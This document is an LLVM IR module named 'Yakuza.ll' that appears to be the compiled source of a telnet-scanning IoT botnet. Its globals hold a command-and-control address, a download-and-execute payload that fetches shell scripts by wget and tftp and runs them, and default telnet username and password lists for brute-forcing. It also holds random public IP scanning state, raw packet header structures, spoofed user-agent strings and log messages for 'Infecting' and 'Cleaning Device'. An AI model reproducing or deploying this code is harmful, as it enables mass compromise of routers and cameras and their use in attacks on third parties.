; ModuleID = 'host/ir_fla/Yakuza.ll'
source_filename = "llvm-link"
target datalayout = "e-m:e-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

%struct.in_addr = type { i32 }
%struct.fd_set = type { [16 x i64] }
%struct.timeval = type { i64, i64 }
%struct.telstate_t = type { i32, i32, i8, i8, i8, i8, i8, i32, i16, i8* }
%struct.__va_list_tag = type { i32, i32, i8*, i8* }
%struct.hostent = type { i8*, i8**, i32, i32, i8** }
%struct.sockaddr_in = type { i16, i16, %struct.in_addr, [8 x i8] }
%struct.sockaddr = type { i16, [14 x i8] }
%struct.iphdr = type { i8, i8, i16, i16, i16, i8, i8, i16, i32, i32 }
%struct.tcphdr = type { %union.anon }
%union.anon = type { %struct.anon }
%struct.anon = type { i16, i16, i32, i32, i8, i8, i16, i16, i16 }
%struct.tcp_pseudo = type { i64, i64, i8, i8, i16 }
%struct.udphdr = type { %union.anon.1 }
%union.anon.1 = type { %struct.anon.2 }
%struct.anon.2 = type { i16, i16, i16, i16 }
%struct.anon.0 = type { i16, i16, i32, i32, i16, i16, i16, i16 }
%struct._IO_FILE = type { i32, i8*, i8*, i8*, i8*, i8*, i8*, i8*, i8*, i8*, i8*, i8*, %struct._IO_marker*, %struct._IO_FILE*, i32, i32, i64, i16, i8, [1 x i8], i8*, i64, i8*, i8*, i8*, i8*, i64, i32, [20 x i8] }
%struct._IO_marker = type { %struct._IO_marker*, %struct._IO_FILE*, i32 }

@commServer = global [1 x i8*] [i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str, i32 0, i32 0)], align 8
@.str = private unnamed_addr constant [13 x i8] c"127.0.0.1:23\00", align 1
@payload = global i8* getelementptr inbounds ([132 x i8], [132 x i8]* @.str.1, i32 0, i32 0), align 8
@.str.1 = private unnamed_addr constant [132 x i8] c"cd /tmp; wget http://127.0.0.1/bins.sh; chmod 777 *; sh bins.sh; tftp -g 127.0.0.1 -r tftp.sh; chmod 777 *; sh tftp.sh; rm -rf *.sh\00", align 1
@tel_usernames = global [6 x i8*] [i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.2, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.3, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.4, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.5, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.6, i32 0, i32 0), i8* getelementptr inbounds ([22 x i8], [22 x i8]* @.str.7, i32 0, i32 0)], align 16
@.str.2 = private unnamed_addr constant [6 x i8] c"root\00\00", align 1
@.str.3 = private unnamed_addr constant [7 x i8] c"admin\00\00", align 1
@.str.4 = private unnamed_addr constant [6 x i8] c"user\00\00", align 1
@.str.5 = private unnamed_addr constant [7 x i8] c"login\00\00", align 1
@.str.6 = private unnamed_addr constant [7 x i8] c"guest\00\00", align 1
@.str.7 = private unnamed_addr constant [22 x i8] c"support\00default\00root\00\00", align 1
@tel_passwords = global [6 x i8*] [i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.2, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.3, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.4, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.5, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.6, i32 0, i32 0), i8* getelementptr inbounds ([23 x i8], [23 x i8]* @.str.8, i32 0, i32 0)], align 16
@.str.8 = private unnamed_addr constant [23 x i8] c"support\00default\00admin\00\00", align 1
@tempdirs = global [10 x i8*] [i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.9, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.10, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.11, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.12, i32 0, i32 0), i8* getelementptr inbounds ([16 x i8], [16 x i8]* @.str.13, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.14, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.15, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.16, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.17, i32 0, i32 0), i8* null], align 16
@.str.9 = private unnamed_addr constant [7 x i8] c"/tmp/*\00", align 1
@.str.10 = private unnamed_addr constant [7 x i8] c"/var/*\00", align 1
@.str.11 = private unnamed_addr constant [11 x i8] c"/var/run/*\00", align 1
@.str.12 = private unnamed_addr constant [11 x i8] c"/var/tmp/*\00", align 1
@.str.13 = private unnamed_addr constant [16 x i8] c"/dev/netslink/*\00", align 1
@.str.14 = private unnamed_addr constant [7 x i8] c"/dev/*\00", align 1
@.str.15 = private unnamed_addr constant [11 x i8] c"/dev/shm/*\00", align 1
@.str.16 = private unnamed_addr constant [7 x i8] c"/usr/*\00", align 1
@.str.17 = private unnamed_addr constant [7 x i8] c"/opt/*\00", align 1
@advances = global [16 x i8*] [i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.18, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.19, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.20, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.21, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.22, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.23, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.24, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.25, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.26, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.27, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.28, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.29, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.30, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.31, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.32, i32 0, i32 0), i8* null], align 16
@.str.18 = private unnamed_addr constant [8 x i8] c"mdm9625\00", align 1
@.str.19 = private unnamed_addr constant [9 x i8] c"9615-cdp\00", align 1
@.str.20 = private unnamed_addr constant [5 x i8] c"F600\00", align 1
@.str.21 = private unnamed_addr constant [5 x i8] c"F660\00", align 1
@.str.22 = private unnamed_addr constant [5 x i8] c"F609\00", align 1
@.str.23 = private unnamed_addr constant [4 x i8] c"BCM\00", align 1
@.str.24 = private unnamed_addr constant [2 x i8] c":\00", align 1
@.str.25 = private unnamed_addr constant [5 x i8] c"user\00", align 1
@.str.26 = private unnamed_addr constant [5 x i8] c"ogin\00", align 1
@.str.27 = private unnamed_addr constant [5 x i8] c"name\00", align 1
@.str.28 = private unnamed_addr constant [5 x i8] c"pass\00", align 1
@.str.29 = private unnamed_addr constant [7 x i8] c"dvrdvs\00", align 1
@.str.30 = private unnamed_addr constant [5 x i8] c"nter\00", align 1
@.str.31 = private unnamed_addr constant [5 x i8] c"User\00", align 1
@.str.32 = private unnamed_addr constant [8 x i8] c"welcome\00", align 1
@fails = global [11 x i8*] [i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.33, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.34, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.35, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.36, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.37, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.38, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.39, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.40, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.41, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.42, i32 0, i32 0), i8* null], align 16
@.str.33 = private unnamed_addr constant [7 x i8] c"nvalid\00", align 1
@.str.34 = private unnamed_addr constant [6 x i8] c"ailed\00", align 1
@.str.35 = private unnamed_addr constant [9 x i8] c"ncorrect\00", align 1
@.str.36 = private unnamed_addr constant [6 x i8] c"enied\00", align 1
@.str.37 = private unnamed_addr constant [5 x i8] c"rror\00", align 1
@.str.38 = private unnamed_addr constant [7 x i8] c"oodbye\00", align 1
@.str.39 = private unnamed_addr constant [4 x i8] c"bad\00", align 1
@.str.40 = private unnamed_addr constant [7 x i8] c"ailure\00", align 1
@.str.41 = private unnamed_addr constant [4 x i8] c"bye\00", align 1
@.str.42 = private unnamed_addr constant [5 x i8] c"exit\00", align 1
@successes = global [18 x i8*] [i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.43, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.44, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.45, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.46, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.29, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.18, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.19, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.20, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.21, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.22, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.47, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.48, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.49, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.50, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.51, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.52, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.23, i32 0, i32 0), i8* null], align 16
@.str.43 = private unnamed_addr constant [8 x i8] c"busybox\00", align 1
@.str.44 = private unnamed_addr constant [2 x i8] c"$\00", align 1
@.str.45 = private unnamed_addr constant [2 x i8] c"#\00", align 1
@.str.46 = private unnamed_addr constant [6 x i8] c"shell\00", align 1
@.str.47 = private unnamed_addr constant [2 x i8] c">\00", align 1
@.str.48 = private unnamed_addr constant [8 x i8] c"version\00", align 1
@.str.49 = private unnamed_addr constant [2 x i8] c"v\00", align 1
@.str.50 = private unnamed_addr constant [7 x i8] c"system\00", align 1
@.str.51 = private unnamed_addr constant [8 x i8] c"command\00", align 1
@.str.52 = private unnamed_addr constant [5 x i8] c"help\00", align 1
@advances2 = global [11 x i8*] [i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.33, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.34, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.35, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.36, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.37, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.38, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.39, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.43, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.44, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.45, i32 0, i32 0), i8* null], align 16
@mainCommSock = global i32 0, align 4
@currentServer = global i32 -1, align 4
@numpids = global i64 0, align 8
@macAddress = global [6 x i8] zeroinitializer, align 1
@uagents = global [59 x i8*] [i8* getelementptr inbounds ([115 x i8], [115 x i8]* @.str.54, i32 0, i32 0), i8* getelementptr inbounds ([85 x i8], [85 x i8]* @.str.55, i32 0, i32 0), i8* getelementptr inbounds ([150 x i8], [150 x i8]* @.str.56, i32 0, i32 0), i8* getelementptr inbounds ([31 x i8], [31 x i8]* @.str.57, i32 0, i32 0), i8* getelementptr inbounds ([73 x i8], [73 x i8]* @.str.58, i32 0, i32 0), i8* getelementptr inbounds ([55 x i8], [55 x i8]* @.str.59, i32 0, i32 0), i8* getelementptr inbounds ([64 x i8], [64 x i8]* @.str.60, i32 0, i32 0), i8* getelementptr inbounds ([85 x i8], [85 x i8]* @.str.61, i32 0, i32 0), i8* getelementptr inbounds ([89 x i8], [89 x i8]* @.str.62, i32 0, i32 0), i8* getelementptr inbounds ([48 x i8], [48 x i8]* @.str.63, i32 0, i32 0), i8* getelementptr inbounds ([107 x i8], [107 x i8]* @.str.64, i32 0, i32 0), i8* getelementptr inbounds ([101 x i8], [101 x i8]* @.str.65, i32 0, i32 0), i8* getelementptr inbounds ([63 x i8], [63 x i8]* @.str.66, i32 0, i32 0), i8* getelementptr inbounds ([101 x i8], [101 x i8]* @.str.67, i32 0, i32 0), i8* getelementptr inbounds ([83 x i8], [83 x i8]* @.str.68, i32 0, i32 0), i8* getelementptr inbounds ([173 x i8], [173 x i8]* @.str.69, i32 0, i32 0), i8* getelementptr inbounds ([73 x i8], [73 x i8]* @.str.70, i32 0, i32 0), i8* getelementptr inbounds ([80 x i8], [80 x i8]* @.str.71, i32 0, i32 0), i8* getelementptr inbounds ([109 x i8], [109 x i8]* @.str.72, i32 0, i32 0), i8* getelementptr inbounds ([82 x i8], [82 x i8]* @.str.73, i32 0, i32 0), i8* getelementptr inbounds ([144 x i8], [144 x i8]* @.str.74, i32 0, i32 0), i8* getelementptr inbounds ([60 x i8], [60 x i8]* @.str.75, i32 0, i32 0), i8* getelementptr inbounds ([103 x i8], [103 x i8]* @.str.76, i32 0, i32 0), i8* getelementptr inbounds ([100 x i8], [100 x i8]* @.str.77, i32 0, i32 0), i8* getelementptr inbounds ([65 x i8], [65 x i8]* @.str.78, i32 0, i32 0), i8* getelementptr inbounds ([154 x i8], [154 x i8]* @.str.79, i32 0, i32 0), i8* getelementptr inbounds ([112 x i8], [112 x i8]* @.str.80, i32 0, i32 0), i8* getelementptr inbounds ([82 x i8], [82 x i8]* @.str.81, i32 0, i32 0), i8* getelementptr inbounds ([65 x i8], [65 x i8]* @.str.82, i32 0, i32 0), i8* getelementptr inbounds ([67 x i8], [67 x i8]* @.str.83, i32 0, i32 0), i8* getelementptr inbounds ([67 x i8], [67 x i8]* @.str.84, i32 0, i32 0), i8* getelementptr inbounds ([67 x i8], [67 x i8]* @.str.85, i32 0, i32 0), i8* getelementptr inbounds ([67 x i8], [67 x i8]* @.str.86, i32 0, i32 0), i8* getelementptr inbounds ([67 x i8], [67 x i8]* @.str.87, i32 0, i32 0), i8* getelementptr inbounds ([110 x i8], [110 x i8]* @.str.88, i32 0, i32 0), i8* getelementptr inbounds ([68 x i8], [68 x i8]* @.str.89, i32 0, i32 0), i8* getelementptr inbounds ([68 x i8], [68 x i8]* @.str.90, i32 0, i32 0), i8* getelementptr inbounds ([68 x i8], [68 x i8]* @.str.91, i32 0, i32 0), i8* getelementptr inbounds ([73 x i8], [73 x i8]* @.str.92, i32 0, i32 0), i8* getelementptr inbounds ([101 x i8], [101 x i8]* @.str.93, i32 0, i32 0), i8* getelementptr inbounds ([68 x i8], [68 x i8]* @.str.94, i32 0, i32 0), i8* getelementptr inbounds ([73 x i8], [73 x i8]* @.str.95, i32 0, i32 0), i8* getelementptr inbounds ([101 x i8], [101 x i8]* @.str.93, i32 0, i32 0), i8* getelementptr inbounds ([70 x i8], [70 x i8]* @.str.96, i32 0, i32 0), i8* getelementptr inbounds ([75 x i8], [75 x i8]* @.str.97, i32 0, i32 0), i8* getelementptr inbounds ([84 x i8], [84 x i8]* @.str.98, i32 0, i32 0), i8* getelementptr inbounds ([71 x i8], [71 x i8]* @.str.99, i32 0, i32 0), i8* getelementptr inbounds ([128 x i8], [128 x i8]* @.str.100, i32 0, i32 0), i8* getelementptr inbounds ([65 x i8], [65 x i8]* @.str.101, i32 0, i32 0), i8* getelementptr inbounds ([76 x i8], [76 x i8]* @.str.102, i32 0, i32 0), i8* getelementptr inbounds ([68 x i8], [68 x i8]* @.str.103, i32 0, i32 0), i8* getelementptr inbounds ([65 x i8], [65 x i8]* @.str.104, i32 0, i32 0), i8* getelementptr inbounds ([100 x i8], [100 x i8]* @.str.105, i32 0, i32 0), i8* getelementptr inbounds ([90 x i8], [90 x i8]* @.str.106, i32 0, i32 0), i8* getelementptr inbounds ([111 x i8], [111 x i8]* @.str.107, i32 0, i32 0), i8* getelementptr inbounds ([110 x i8], [110 x i8]* @.str.108, i32 0, i32 0), i8* getelementptr inbounds ([122 x i8], [122 x i8]* @.str.109, i32 0, i32 0), i8* getelementptr inbounds ([116 x i8], [116 x i8]* @.str.110, i32 0, i32 0), i8* getelementptr inbounds ([111 x i8], [111 x i8]* @.str.111, i32 0, i32 0)], align 16
@.str.54 = private unnamed_addr constant [115 x i8] c"Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36\00", align 1
@.str.55 = private unnamed_addr constant [85 x i8] c"FAST-WebCrawler/3.6 (atw-crawler at fast dot no; http://fast.no/support/crawler.asp)\00", align 1
@.str.56 = private unnamed_addr constant [150 x i8] c"Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; SLCC1; .NET CLR 2.0.50727; .NET CLR 1.1.4322; .NET CLR 3.5.30729; .NET CLR 3.0.30729)\00", align 1
@.str.57 = private unnamed_addr constant [31 x i8] c"TheSuBot/0.2 (www.thesubot.de)\00", align 1
@.str.58 = private unnamed_addr constant [73 x i8] c"Opera/9.80 (X11; Linux i686; Ubuntu/14.10) Presto/2.12.388 Version/12.16\00", align 1
@.str.59 = private unnamed_addr constant [55 x i8] c"BillyBobBot/1.0 (+http://www.billybobbot.com/crawler/)\00", align 1
@.str.60 = private unnamed_addr constant [64 x i8] c"Mozilla/5.0 (Windows; U; Windows NT 6.1; rv:2.2) Gecko/20110201\00", align 1
@.str.61 = private unnamed_addr constant [85 x i8] c"FAST-WebCrawler/3.7 (atw-crawler at fast dot no; http://fast.no/support/crawler.asp)\00", align 1
@.str.62 = private unnamed_addr constant [89 x i8] c"Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.1) Gecko/20090718 Firefox/3.5.1\00", align 1
@.str.63 = private unnamed_addr constant [48 x i8] c"zspider/0.9-dev http://feedback.redkolibri.com/\00", align 1
@.str.64 = private unnamed_addr constant [107 x i8] c"Mozilla/5.0 (Windows; U; Windows NT 6.1; en; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)\00", align 1
@.str.65 = private unnamed_addr constant [101 x i8] c"Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; SV1; .NET CLR 2.0.50727; InfoPath.2)\00", align 1
@.str.66 = private unnamed_addr constant [63 x i8] c"Opera/9.80 (Windows NT 5.2; U; ru) Presto/2.5.22 Version/10.51\00", align 1
@.str.67 = private unnamed_addr constant [101 x i8] c"Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.36\00", align 1
@.str.68 = private unnamed_addr constant [83 x i8] c"Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.3) Gecko/20090913 Firefox/3.5.3\00", align 1
@.str.69 = private unnamed_addr constant [173 x i8] c"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_3) AppleWebKit/537.75.14 (KHTML, like Gecko) Version/7.0.3 Safari/7046A194ABaiduspider+(+http://www.baidu.com/search/spider.htm)\00", align 1
@.str.70 = private unnamed_addr constant [73 x i8] c"Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; AS; rv:11.0) like Gecko\00", align 1
@.str.71 = private unnamed_addr constant [80 x i8] c"Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.8) Gecko/20090327 Galeon/2.0.7\00", align 1
@.str.72 = private unnamed_addr constant [109 x i8] c"Opera/9.80 (J2ME/MIDP; Opera Mini/5.0 (Windows; U; Windows NT 5.1; en) AppleWebKit/886; U; en) Presto/2.4.15\00", align 1
@.str.73 = private unnamed_addr constant [82 x i8] c"Mozilla/5.0 (Android; Linux armv7l; rv:9.0) Gecko/20111216 Firefox/9.0 Fennec/9.0\00", align 1
@.str.74 = private unnamed_addr constant [144 x i8] c"Mozilla/5.0 (iPhone; U; CPU OS 3_2 like Mac OS X; en-us) AppleWebKit/531.21.10 (KHTML, like Gecko) Version/4.0.4 Mobile/7B334b Safari/531.21.10\00", align 1
@.str.75 = private unnamed_addr constant [60 x i8] c"Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US; rv:1.9.1.3)\00", align 1
@.str.76 = private unnamed_addr constant [103 x i8] c"Mozilla/5.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; .NET CLR 1.1.4322; .NET CLR 2.0.50727)\00", align 1
@.str.77 = private unnamed_addr constant [100 x i8] c"Mozilla/5.0 (Windows NT 5.1) AppleWebKit/536.5 (KHTML, like Gecko) Chrome/19.0.1084.56 Safari/536.5\00", align 1
@.str.78 = private unnamed_addr constant [65 x i8] c"Opera/9.80 (Windows NT 5.1; U; en) Presto/2.10.229 Version/11.60\00", align 1
@.str.79 = private unnamed_addr constant [154 x i8] c"Mozilla/5.0 (iPad; U; CPU OS 5_1 like Mac OS X) AppleWebKit/531.21.10 (KHTML, like Gecko) Version/4.0.4 Mobile/7B367 Safari/531.21.10 UCBrowser/3.4.3.532\00", align 1
@.str.80 = private unnamed_addr constant [112 x i8] c"Mozilla/5.0 (Nintendo WiiU) AppleWebKit/536.30 (KHTML, like Gecko) NX/3.0.4.2.12 NintendoBrowser/4.3.1.11264.US\00", align 1
@.str.81 = private unnamed_addr constant [82 x i8] c"Mozilla/5.0 (Macintosh; Intel Mac OS X 10.6; rv:25.0) Gecko/20100101 Firefox/25.0\00", align 1
@.str.82 = private unnamed_addr constant [65 x i8] c"Mozilla/4.0 (compatible; MSIE 10.0; Windows NT 6.1; Trident/5.0)\00", align 1
@.str.83 = private unnamed_addr constant [67 x i8] c"Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; pl) Opera 11.00\00", align 1
@.str.84 = private unnamed_addr constant [67 x i8] c"Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; en) Opera 11.00\00", align 1
@.str.85 = private unnamed_addr constant [67 x i8] c"Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; ja) Opera 11.00\00", align 1
@.str.86 = private unnamed_addr constant [67 x i8] c"Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; cn) Opera 11.00\00", align 1
@.str.87 = private unnamed_addr constant [67 x i8] c"Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; fr) Opera 11.00\00", align 1
@.str.88 = private unnamed_addr constant [110 x i8] c"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/50.0.2661.102 Safari/537.36\00", align 1
@.str.89 = private unnamed_addr constant [68 x i8] c"Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; FSL 7.0.6.01001)\00", align 1
@.str.90 = private unnamed_addr constant [68 x i8] c"Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; FSL 7.0.7.01001)\00", align 1
@.str.91 = private unnamed_addr constant [68 x i8] c"Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; FSL 7.0.5.01003)\00", align 1
@.str.92 = private unnamed_addr constant [73 x i8] c"Mozilla/5.0 (Windows NT 6.1; WOW64; rv:12.0) Gecko/20100101 Firefox/12.0\00", align 1
@.str.93 = private unnamed_addr constant [101 x i8] c"Mozilla/5.0 (X11; U; Linux x86_64; de; rv:1.9.2.8) Gecko/20100723 Ubuntu/10.04 (lucid) Firefox/3.6.8\00", align 1
@.str.94 = private unnamed_addr constant [68 x i8] c"Mozilla/5.0 (Windows NT 5.1; rv:13.0) Gecko/20100101 Firefox/13.0.1\00", align 1
@.str.95 = private unnamed_addr constant [73 x i8] c"Mozilla/5.0 (Windows NT 6.1; WOW64; rv:11.0) Gecko/20100101 Firefox/11.0\00", align 1
@.str.96 = private unnamed_addr constant [70 x i8] c"Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0; .NET CLR 1.0.3705)\00", align 1
@.str.97 = private unnamed_addr constant [75 x i8] c"Mozilla/5.0 (Windows NT 6.1; WOW64; rv:13.0) Gecko/20100101 Firefox/13.0.1\00", align 1
@.str.98 = private unnamed_addr constant [84 x i8] c"Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)\00", align 1
@.str.99 = private unnamed_addr constant [71 x i8] c"Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; WOW64; Trident/5.0)\00", align 1
@.str.100 = private unnamed_addr constant [128 x i8] c"Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; Trident/4.0; .NET CLR 2.0.50727; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729)\00", align 1
@.str.101 = private unnamed_addr constant [65 x i8] c"Opera/9.80 (Windows NT 5.1; U; en) Presto/2.10.289 Version/12.01\00", align 1
@.str.102 = private unnamed_addr constant [76 x i8] c"Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; SV1; .NET CLR 2.0.50727)\00", align 1
@.str.103 = private unnamed_addr constant [68 x i8] c"Mozilla/5.0 (Windows NT 5.1; rv:5.0.1) Gecko/20100101 Firefox/5.0.1\00", align 1
@.str.104 = private unnamed_addr constant [65 x i8] c"Mozilla/5.0 (Windows NT 6.1; rv:5.0) Gecko/20100101 Firefox/5.02\00", align 1
@.str.105 = private unnamed_addr constant [100 x i8] c"Mozilla/5.0 (Windows NT 6.0) AppleWebKit/535.1 (KHTML, like Gecko) Chrome/13.0.782.112 Safari/535.1\00", align 1
@.str.106 = private unnamed_addr constant [90 x i8] c"Mozilla/4.0 (compatible; MSIE 6.0; MSIE 5.5; Windows NT 5.0) Opera 7.02 Bork-edition [en]\00", align 1
@.str.107 = private unnamed_addr constant [111 x i8] c"Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.116 Safari/537.36\00", align 1
@.str.108 = private unnamed_addr constant [110 x i8] c"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.116 Safari/537.36\00", align 1
@.str.109 = private unnamed_addr constant [122 x i8] c"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.116 Safari/537.36\00", align 1
@.str.110 = private unnamed_addr constant [116 x i8] c"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.116 Safari/537.36\00", align 1
@.str.111 = private unnamed_addr constant [111 x i8] c"Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36\00", align 1
@pids = common global i32* null, align 8
@ourIP = common global %struct.in_addr zeroinitializer, align 4
@scanPid = common global i32 0, align 4
@.str.53 = private unnamed_addr constant [7 x i8] c"x86_64\00", align 1
@Q = internal global [4096 x i32] zeroinitializer, align 16
@rand_cmwc.i = internal global i32 4095, align 4
@c = internal global i32 362436, align 4
@.str.209 = private unnamed_addr constant [7 x i8] c"(null)\00", align 1
@.str.112 = private unnamed_addr constant [4 x i8] c"%s\0A\00", align 1
@.str.113 = private unnamed_addr constant [7 x i8] c":>%$#\00\00", align 1
@getRandomPublicIP.ipState = internal global [4 x i8] zeroinitializer, align 1
@.str.114 = private unnamed_addr constant [12 x i8] c"%d.%d.%d.%d\00", align 1
@TelnetIPRanges.ipState = internal global [4 x i8] zeroinitializer, align 1
@.str.115 = private unnamed_addr constant [3 x i8] c"\0D\0A\00", align 1
@.str.116 = private unnamed_addr constant [72 x i8] c"[ Yakuza ] Result || IP: %s || Port: 23 || Username: %s || Password: %s\00", align 1
@.str.117 = private unnamed_addr constant [11 x i8] c"rm -rf %s;\00", align 1
@.str.118 = private unnamed_addr constant [81 x i8] c"[ Yakuza ] Cleaning Device || IP: %s || Port: 23 || Username: %s || Password: %s\00", align 1
@.str.119 = private unnamed_addr constant [5 x i8] c"sh\0D\0A\00", align 1
@.str.120 = private unnamed_addr constant [8 x i8] c"shell\0D\0A\00", align 1
@.str.121 = private unnamed_addr constant [75 x i8] c"[ Yakuza ] Infecting || IP: %s || Port: 23 || Username: %s || Password: %s\00", align 1
@.str.122 = private unnamed_addr constant [10 x i8] c"connected\00", align 1
